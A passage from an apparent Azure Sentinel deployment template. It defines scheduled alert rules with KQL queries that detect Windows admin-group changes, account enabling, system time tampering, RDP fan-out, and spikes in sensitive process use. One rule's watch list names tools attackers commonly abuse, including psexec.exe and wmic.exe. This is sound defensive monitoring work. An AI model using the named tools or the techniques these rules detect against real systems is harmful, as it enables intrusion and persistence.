        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-129')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-129')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-129: [RBA] Windows - New user in built-in administrators group",
          "description": "Identifies when a user account was created and then added to the builtin Administrators group in the same day. This should be monitored closely and all additions reviewed. MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4720', '4732']);\nlet timeframe = 1d;\nbv_parser_security_event\n| where TimeGenerated > ago(timeframe)\n| where EventID == EventIDList[0]\n| where AccountType == 'User'\n| project CreatedUserTime = TimeGenerated, CreatedUserEventID = EventID, CreatedUserActivity = Activity, Computer = toupper(Computer),\nCreatedUser = tolower(TargetUserName), Domain = toupper(TargetDomainName), CreatedUserSid = TargetSid, AccountUsedToCreateUser = SubjectUserName\n|join (\nbv_parser_security_event\n| where TimeGenerated > ago(timeframe)\n| where AccountType == 'User'\n// 4732 - A member was added to a security-enabled local group\n| where EventID == EventIDList[1]\n//TargetSid is the builtin Admins group: S-1-5-32-544\n| where TargetSid == 'S-1-5-32-544'\n| project GroupAddTime = TimeGenerated, GroupAddEventID = EventID, GroupAddActivity = Activity, Computer = toupper(Computer), GroupName = TargetUserName,\nDomain = toupper(TargetDomainName), GroupSid = TargetSid, UserAdded = SubjectUserName, UserAddedSid = SubjectUserSid, CreatedUser = tolower(SubjectUserName),\nCreatedUserSid = MemberSid\n)\non CreatedUserSid\n//Create User first, then the add to the group.\n| project Computer, CreatedUserTime, CreatedUserEventID, CreatedUserActivity, CreatedUser, CreatedUserSid, Domain, GroupAddTime, GroupAddEventID,\nGroupAddActivity, AccountUsedToCreateUser, GroupName, GroupSid, UserAdded, UserAddedSid\n| extend timestamp = CreatedUserTime, AccountCustomEntity = CreatedUser, HostCustomEntity = Computer",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-126')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-126')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-126: [RBA] Windows - System Time Was Changed",
          "description": "This alert is triggered whenever the system time is changed and the time difference is bigger than 10 minutes. It is normal for the Windows Time Service, which runs with System privilege, to change the system time on a regular basis. Other system time changes may be indicative of attempts to tamper with the computer. MITRE: T1070 Category: Windows Security Events tag: RBA",
          "severity": "Informational",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4616']);\nbv_parser_security_event\n| where TimeGenerated > ago(1d)\n| where EventID in (EventIDList)\n| extend TimeDiffMinutes = abs((todatetime(NewTime) - todatetime(PreviousTime))/1m)\n| where TimeDiffMinutes > A126_TIME_DELTA_THRESHOLD_MINS\n| extend bv_rule_version = '1.0.5190'\n| extend bv_rule_timestamp = '1713450466.7001011'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.5190 bv_rule_timestamp: 1713450466.7001011'\n| project Activity, Account, Computer, TimeDiffMinutes, PreviousTime, NewTime\n| extend AccountCustomEntity = Account\n| extend HostCustomEntity = Computer\n| extend bv_rule_combined_string = ''",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1070"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This alert is triggered whenever the system time is changed and the time difference is bigger than 10 minutes. It is normal for the Windows Time Service, which runs with System privilege, to change the system time on a regular basis. Other system time changes may be indicative of attempts to tamper with the computer.\n\ntag: RBA\n\nCategory:Windows Security\n\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-082')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-082')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-082: [RBA] Windows - Account Enabled",
          "description": "This alerts is triggered whenever a user account is enabled MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 10m;\nlet alert_bin = 10m;\nlet end_time = now();\nlet EventIDList = dynamic(['4722']);\nlet alert_id = 'BV-082:';\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n    'RBASCORE':0,\n    'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV082_CONFIG['EXCLUSION'], dynamic([{}]));\nlet excluded_description_fields = dynamic([]);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV082_CONFIG['RBASCORE']),real(0.0));\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | extend bv_rule_version = '1.1.5166'\n| extend bv_rule_timestamp = '1712866315.0182095'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5166 bv_rule_timestamp: 1712866315.0182095'\n| project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | extend bv_rule_version = '1.1.5166'\n| extend bv_rule_timestamp = '1712866315.0182095'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5166 bv_rule_timestamp: 1712866315.0182095'\n| project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains 'true', true, false)\n};\nbv_parser_security_event\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where TargetUserName !endswith '$'\n| extend bv_rule_version = '1.1.5166'\n| extend bv_rule_timestamp = '1712866315.0182095'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5166 bv_rule_timestamp: 1712866315.0182095'\n| project \n    bv_user = TargetUserName\n    , bv_user_id = TargetUserSid\n    , bv_src_user = SubjectUserName\n    , bv_src_user_id = SubjectUserSid\n    , bv_object = TargetUserName\n    , bv_object_id = TargetUserSid\n    , bv_object_category = 'user'\n    , bv_change_action = 'start'\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'bv_parser_security_event'\n    | extend bv_tuning_target = tolower(bv_cim_normalize_username(bv_src_user))\n  |where bv_tuning_target !in~ (AUTHORIZED_ADMINS_V2) \n  |project-away bv_tuning_target \n| invoke exclusion_filter()\n| where drop_event == false\n| invoke rba_score_calculator('BV-082')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_object)\n| extend bv_alarm_attacker_entities = pack_array(bv_src_user)\n, bv_dedup_hash = hash_sha1(strcat(bv_src_user,bv_user))\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n| invoke description(excluded_description_fields, 300, 5)      \n| extend bv_rule_version = '1.1.5166'\n| extend bv_rule_timestamp = '1712866315.0182095'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5166 bv_rule_timestamp: 1712866315.0182095'\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-082: [RBA] Windows - {{bv_src_user}} enabled {{bv_object}}",
            "alertDescriptionFormat": "This alert notifies when an Windows AD account has been enabled\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1098\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-121')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-121')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-121: [RBA] Windows - Account added and removed from privileged groups",
          "description": "Identifies accounts that are added to privileged group and then quickly removed, which could be a sign of compromise. MITRE: T1098 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4728', '4732', '4756', '4729', '4733', '4757']);\nlet start_time = 1h;\nlet latency = 1h;\nlet end_time = now();\nlet WellKnownLocalSID = 'S-1-5-32-5[0-9][0-9]$';\nlet WellKnownGroupSID = 'S-1-5-21-[0-9]*-[0-9]*-[0-9]*-5[0-9][0-9]$|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1102|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1103';\nlet AC_Add =\nbv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (array_slice(EventIDList, 0, 2))\n| where TargetSid matches regex WellKnownLocalSID or TargetSid matches regex WellKnownGroupSID or TargetUserName has_any (PRIVILEGED_GROUPS)\n| parse EventData with * 'MemberName\">' AccountAdded ',OU' *\n| where isnotempty(AccountAdded)\n| extend GroupAddedTo = TargetUserName, AddingAccount = Account\n| extend  AccountAdded_GroupAddedTo_AddingAccount = strcat(AccountAdded, '||', GroupAddedTo, '||', AddingAccount )\n| project AccountAdded_GroupAddedTo_AddingAccount, AccountAddedTime = TimeGenerated;\nlet AC_Remove =\nbv_parser_security_event\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (array_slice(EventIDList, 3, 5))\n| where TargetSid matches regex WellKnownLocalSID or TargetSid matches regex WellKnownGroupSID or TargetUserName has_any (PRIVILEGED_GROUPS)\n| parse EventData with * 'MemberName\">' AccountRemoved ',OU' *\n| where isnotempty(AccountRemoved)\n| extend GroupRemovedFrom = TargetUserName, RemovingAccount = Account\n| extend AccountRemoved_GroupRemovedFrom_RemovingAccount = strcat(AccountRemoved, '||', GroupRemovedFrom, '||', RemovingAccount)\n| project AccountRemoved_GroupRemovedFrom_RemovingAccount, AccountRemovedTime = TimeGenerated, Computer, RemovedAccountId = tolower(AccountRemoved),\nRemovedByUser = SubjectUserName, RemovedByUserLogonId = SubjectLogonId,  GroupRemovedFrom = TargetUserName, TargetDomainName;\nAC_Add\n| join kind= inner AC_Remove on $left.AccountAdded_GroupAddedTo_AddingAccount == $right.AccountRemoved_GroupRemovedFrom_RemovingAccount\n| extend DurationinSecondAfter_Removed = datetime_diff ('second', AccountRemovedTime, AccountAddedTime)\n| where DurationinSecondAfter_Removed > 0\n| project-away AccountRemoved_GroupRemovedFrom_RemovingAccount\n| extend timestamp = AccountAddedTime, AccountCustomEntity = RemovedAccountId, HostCustomEntity = Computer\n| extend ExtendedDescription = strcat('User account ',AccountCustomEntity, ' was added and removed from group ', GroupRemovedFrom, ' in a short period of time by user account ', RemovedByUser)\n| project timestamp, AccountCustomEntity, GroupRemovedFrom, TargetDomainName, DurationinSecondAfter_Removed, RemovedByUser, Computer, HostCustomEntity, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Identifies accounts that are added to privileged group and then quickly removed, which could be a sign of compromise.\n\n{{ExtendedDescription}}\n\nMITRE: T1098 \nCategory: Windows Security\ntag: RBA"
          },
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-061')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-061')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-061: [RBA] Windows - Process Execution Frequency Anomaly",
          "description": "Identifies anomalous spike in frequency of executions of sensitive processes which are often leveraged as attack vectors.  The query leverages KQL built-in anomaly detection algorithms to find large deviations from baseline patterns.  Sudden increases in execution frequency of sensitive processes should be further investigated for malicious activity. Tune the values from 1.5 to 3 in series_decompose_anomalies for further outliers or based on custom threshold values for score. MITRE: T1204,T1059 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);\nlet starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet TotalEventsThreshold = 5;\nlet ExeList = dynamic(['powershell.exe','cmd.exe','wmic.exe','psexec.exe','cacls.exe','rundll.exe']);\nlet TimeSeriesData = \nbv_parser_security_event\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where EventID in (EventIDList)\n| extend Process = tolower(Process)\n| where Process in (ExeList)\n| project TimeGenerated, Computer, AccountType, Account, Process\n| make-series Total=count() on TimeGenerated from ago(starttime) to ago(endtime) step timeframe by Process;\nlet TimeSeriesAlerts = TimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, 1.5, -1, 'linefit')\n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long)\n| where anomalies > 0\n| project Process, TimeGenerated, Total, baseline, anomalies, score\n| where Total > TotalEventsThreshold;\nTimeSeriesAlerts\n| join (\nbv_parser_security_event\n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where EventID in (EventIDList) \n| extend Process = tolower(Process)\n| summarize CommandlineCount = count() by bin(TimeGenerated, 1h), Process, CommandLine, Computer, Account\n) on Process, TimeGenerated \n| project AnomalyHour = TimeGenerated, Computer, Account, Process, CommandLine, CommandlineCount, Total, baseline, anomalies, score \n| extend timestamp = AnomalyHour, AccountCustomEntity = Account, HostCustomEntity = Computer",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1204",
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-015')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-015')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-015: [RBA] Windows - Creation and modification of a Windows privileged account",
          "description": "Identifies when a user account has been added to a privileged built in domain local group or global group such as the Enterprise Admins, Cert Publishers or DnsAdmins. Be sure to verify this is an expected addition. For AD SID mappings - https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups. MITRE: T1136,T1098 Category: Windows Security Events tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4728', '4732', '4756', '4729']);\nlet timeframe = 6h;\nlet WellKnownGroupSID = 'S-1-5-21-[0-9]*-[0-9]*-[0-9]*-5[0-9][0-9]$|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1102|S-1-5-21-[0-9]*-[0-9]*-[0-9]*-1103|S-1-5-32-5[0-9][0-9]$';\nlet MonitoredGroups = set_union(MONITORED_AD_GROUPS, dynamic(['Hyper-V Administrators']));\nbv_parser_security_event\n| where TimeGenerated between (ago(8h)..now())//8h\n| where ingestion_time() >= ago(6h)//6h or timeframe\n| where AccountType =~ 'User'\n| where EventID in (EventIDList) \n| where TargetSid matches regex WellKnownGroupSID or TargetUserName in~ (MonitoredGroups)\n| where TargetSid !in ('S-1-5-32-555')\n| project TimeGenerated, Computer, MemberName, TargetAccount, Account,Activity,EventData,EventID,EventSourceName,ManagementGroupName,MemberSid,SourceComputerId,SourceSystem,SubjectDomainName,SubjectUserName,TargetUserName\n| extend SourceUser = Account, LogSourceHost = Computer\n| summarize EventCount=count(),First=min(TimeGenerated),Last=max(TimeGenerated),LogSourceHost=make_set(LogSourceHost),TargetUser=make_set(TargetUserName),Events=make_set(pack_all(),MaxSize=5)by SourceUser,bin(TimeGenerated,timeframe)\n| extend Description = 'Identifies when a user account has been added to a privileged built in domain local group or global group such as the Enterprise Admins, Cert Publishers or DnsAdmins. Be sure to verify this is an expected addition. For AD SID mappings - https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups.'\n| extend SystemAlertPlatform = 'Correlation'\n| project EventCount, First, Last, LogSourceHost, TargetGroup=TargetUser, Events, SourceUser, SystemAlertPlatform, Description",
          "queryFrequency": "PT6H",
          "queryPeriod": "PT8H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1136",
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "TargetHost": "LogSourceHost",
            "LogSourceHost": "LogSourceHost",
            "TargetGroup": "TargetGroup",
            "SourceUser": "SourceUser",
            "SystemAlertPlatform": "SystemAlertPlatform",
            "Details": "Description"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SourceUser"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-064')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-064')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-064: [RBA] Windows - Multiple RDP connections from Single System",
          "description": "Identifies when an RDP connection is made to multiple systems and above the normal for the previous 7 days. Connections from the same system with the same account within the same day. RDP connections are indicated by the EventID 4624 with LogonType = 10 MITRE: T1078 Category: Windows Security Events tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4624']);\nlet endtime = 1d;\nlet starttime = 8d;\nlet threshold = 2.0;\nbv_parser_security_event\n| where TimeGenerated between (ago(endtime) .. now())\n| where EventID in (EventIDList)\n| where LogonType == 10\n| where tolower(Computer) matches regex tolower(A064_EXCLUDED_COMPUTERS) == false\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), ComputerCountToday = dcount(Computer), ComputerSet = make_set(Computer, 5), ProcessSet = make_set(ProcessName, 5) by Account, IpAddress, AccountType, Activity, LogonTypeName, EventID\n| join kind=inner (\nbv_parser_security_event\n| where TimeGenerated >= ago(starttime) and TimeGenerated < ago(endtime)\n| where EventID in (EventIDList)\n| where LogonType == 10\n| where tolower(Computer) matches regex tolower(A064_EXCLUDED_COMPUTERS) == false\n| summarize ComputerCountPrev7Days = dcount(Computer) by Account, IpAddress\n) on Account, IpAddress\n| extend Ratio = ComputerCountToday/(ComputerCountPrev7Days*1.0)\n| where Ratio > threshold\n| project StartTimeUtc, EndTimeUtc, Account, IpAddress, ComputerSet, ComputerCountToday, ComputerCountPrev7Days, Ratio, AccountType, Activity, LogonTypeName, ProcessSet, EventID\n| extend AccountCustomEntity = Account, IPCustomEntity = IpAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P8D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            },
            {
